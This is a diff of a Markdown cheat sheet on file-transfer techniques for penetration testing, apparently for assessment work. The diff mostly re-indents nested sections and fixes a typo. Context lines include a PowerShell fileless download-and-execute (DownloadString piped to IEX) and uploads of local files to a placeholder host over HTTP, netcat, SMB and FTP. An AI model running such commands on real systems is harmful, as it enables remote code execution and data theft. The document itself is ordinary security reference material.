@@ -8,11 +8,11 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 
 <details>
 <summary><strong>🪟 Windows</strong></summary>
-<details>  
+&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><strong>📥 Downloads</strong></summary>
-<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><strong>PowerShell Downloads</strong></summary>  
-<details> 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
 <summary><strong>PowerShell DownloadFile Method</strong></summary>
 
 **Sync (Wait for the download to finish)**  
@@ -38,8 +38,7 @@ Using Credentials
 ```
 
 </details>
-
-<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>
 
 Default  
@@ -52,8 +51,7 @@ Pipeline input
 (New-Object Net.WebClient).DownloadString('<FILE URL>') | IEX
 ```
 </details>
-
-<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><strong>PowerShell Invoke-WebRequest</strong></summary>
 
 Default  
@@ -72,8 +70,7 @@ ByPass SSL/TLS Error
 ```
 </details>
 </details>
-
-<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><strong>SMB Downloads</strong></summary>
 
 **Prepare the server on Linux**
@@ -99,7 +96,7 @@ copy \\<IP>\share\<FILE>
 net use n: \\<IP>\share /persistent:no
 ```
 
-**Using credentialts**
+**Using credentials**
 
 Create the SMB Server in Linux
 ```bash
@@ -119,8 +116,7 @@ net use n: /delete /y
 ```
 
 </details>
-
-<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><strong>FTP Downloads</strong></summary>  
 
 Setting up a Python3 FTP Server in Linux
@@ -149,11 +145,11 @@ ftp -i -v -n -s:ftpcommand.txt
 
 </details>
 </details>
-<details>  
+&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><strong>📥 Uploads</strong></summary>  
-<details>  
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><strong>PowerShell Uploads</strong></summary>  
-<details>  
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><strong>PowerShell Base64 Encode & Decode</strong></summary>  
 
 1. Encode File Using PowerShell 
@@ -178,7 +174,7 @@ base64 -d encoded.b64 > decoded.txt
 md5sum decoded.txt
 ```
 </details>
-<details>  
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><strong>PowerShell Web Uploads</strong></summary>  
 
 1. Installing a Configured WebServer with Upload in Linux
@@ -193,7 +189,7 @@ Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
 ```
 
 </details>
-<details>  
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><strong>PowerShell Base64 Web Upload</strong></summary>  
 
 1. We use Netcat to listen in on a port we specify and send the file as a POST request.
@@ -211,7 +207,7 @@ echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
 ```
 </details>
 </details>
-<details> 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
 <summary><strong>SMB Uploads</strong></summary>  
 
 1. Installing WebDav Python modules in Linux
@@ -230,7 +226,7 @@ copy <FILE PATH> \\<IP>\sharefolder\
 ```
 If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
 </details>
-<details> 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
 <summary><strong>FTP Uploads</strong></summary>  
 
 **1. Start our FTP Server in Linux**
@@ -267,6 +263,7 @@ bye
 
 <details>
 <summary><strong>🐧 Linux</strong></summary>
+
 </details>
 
 ---
